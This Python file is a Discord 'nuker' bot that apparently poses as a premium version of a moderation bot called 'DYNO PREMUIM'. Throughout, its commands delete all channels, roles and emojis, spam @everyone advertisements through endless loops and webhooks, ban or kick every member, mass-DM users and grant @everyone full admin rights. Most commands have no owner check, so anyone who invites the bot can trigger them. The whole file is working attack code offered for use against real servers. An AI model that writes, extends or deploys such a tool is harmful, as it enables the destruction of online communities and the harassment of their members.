import os
import discord
from discord.ext import commands
import random
from webserver import keep_alive
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions
import asyncio



roles_spam = ["TEAM NG ON TOP","NUKED BY TEAM NG"]
CHANNEL_NAMES =  ["lmao nuked by TEAM NG", "nuked by TEAM NG"]
Shubham_OP = ["TEAM NG ON TOP"]
SPAM_MESSAGE = ["@everyone @here NUKED BY BIGGEST NUKERS **TEAM NG**  https://media.discordapp.net/attachments/983650055997239337/983689245740904448/ng_banner_final.png","@everyone @here https://discord.gg/nGr2RnuTQk"]
WEBHOOK_NAMES = ['TEAM NG ON TOP']



intents = discord.Intents.all()
client = discord.Client()
client = commands.Bot(command_prefix=".", intents=intents, help_command=None)

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "DYNO PREMUIM"))
  print ('''
████████╗███████╗░█████╗░███╗░░░███╗  ███╗░░██╗░██████╗░  ░█████╗░███╗░░██╗  ████████╗░█████╗░██████╗░
╚══██╔══╝██╔════╝██╔══██╗████╗░████║  ████╗░██║██╔════╝░  ██╔══██╗████╗░██║  ╚══██╔══╝██╔══██╗██╔══██╗
░░░██║░░░█████╗░░███████║██╔████╔██║  ██╔██╗██║██║░░██╗░  ██║░░██║██╔██╗██║  ░░░██║░░░██║░░██║██████╔╝
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  ██║╚████║██║░░╚██╗  ██║░░██║██║╚████║  ░░░██║░░░██║░░██║██╔═══╝░
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  ██║░╚███║╚██████╔╝  ╚█████╔╝██║░╚███║  ░░░██║░░░╚█████╔╝██║░░░░░
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚══╝░╚═════╝░  ░╚════╝░╚═╝░░╚══╝  ░░░╚═╝░░░░╚════╝░╚═╝░░░░░'''
       
        f"\n\nLogged as {client.user}")


@client.command()
async def nuke(ctx, amount = 50):
  await ctx.message.delete()
  await ctx.guild.edit(name="TEAM NG ON TOP")
  guild = ctx.guild
  for channel in guild.channels:
      try:
        await channel.delete()
      except:
        pass
  for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
     except:
       pass
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
    except:
      pass
  for i in range(amount):
    try:  
      await ctx.guild.create_role(random.choice(roles_spam))
    except:
      pass     
  for role in ctx.guild.roles:
    try:
      await role.delet()
    except:
      pass
  for i in range(1000):  
    for i in range(10000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(SPAM_MESSAGE))
        except:
          pass
  for member in ctx.guild.members:
      if member.id != 320408390587121664:  
        try:
          await member.ban(reason="NUKED BY TEAM NG")
        except:
          pass

@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NUKED BY TEAM NG")
    except:
      pass

@client.command()
@commands.is_owner()
async def online(ctx):
    await client.change_presence(status=discord.Status.online)
    await ctx.message.delete()

@client.command()
@commands.is_owner()
async def offline(ctx):
    await client.change_presence(status=discord.Status.offline)
    await ctx.message.delete() 

@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")

@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")

@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(random.choice(roles_spam))
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")

@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")


# ︻╦╤─ **DYNO PREMUIM BOT**︻╦╤─

# help - Show This Message
# nuke - To NUKE Server
# ball - To BAN All
# kickall - To KICK All
# dm - To DM All Members 
# rolespam - To Spam ROLES
# admin - To Give ADMIN Power To @everyone
# serverinfo - To See SERVERINFO
# online - To Change Bot Status To ONLINE (BOT OWNER ONLY)
# offline - To Change Bot Status To OFFLINE (BOT OWNER ONLY)


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    member = ctx.message.author
    retStr = str("""```diff
\n\n- .help - Show This Message \n\n- .nuke - To NUKE Server \n\n- .ball - To BAN All \n\n- .kickall - To KICK All \n\n- .dm - To DM All Members \n\n- .rolespam - To Spam ROLES \n\n- .admin - To Give ADMIN Power To @everyone \n\n- .serverinfo - To See SERVERINFO \n\n- .online - To Change Bot Status To ONLINE (BOT OWNER ONLY) \n\n- .offline - To Change Bot Status To OFFLINE (BOT OWNER ONLY)```""")
    embed = discord.Embed(color=65280,title="DYNO PREMUIM")
    embed.add_field(name="COMMANDS:-",value=retStr)
    embed.set_footer(text=f"Requested By {ctx.author} | ™TEAM NG | DYNO PREMUIM")

    await member.send(embed=embed)


@client.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    icon_url = f"https://cdn.discordapp.com/icons/{ctx.guild.id}/{ctx.guild.icon}.webp"
    await ctx.send(f"""```
{ctx.guild.name} Info:

🆔Server ID: {ctx.guild.id}
📆Created On: {ctx.guild.created_at.strftime(date_format)}
👑Owner: {ctx.guild.owner}
👥Members: {ctx.guild.member_count} Members
💬Channels: {len(ctx.guild.text_channels)} Text | {len(ctx.guild.voice_channels)} Voice
🛠️Roles: {len(ctx.guild.roles)} Roles
😀Emojis: {len(ctx.guild.emojis)} Emojis
🌎Region: {ctx.guild.region}```
{icon_url}   
""")

@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(SPAM_MESSAGE))
    await webhook.send(random.choice(SPAM_MESSAGE), username=random.choice(WEBHOOK_NAMES))
    
token = os.environ['TOKEN']
client.run(token)
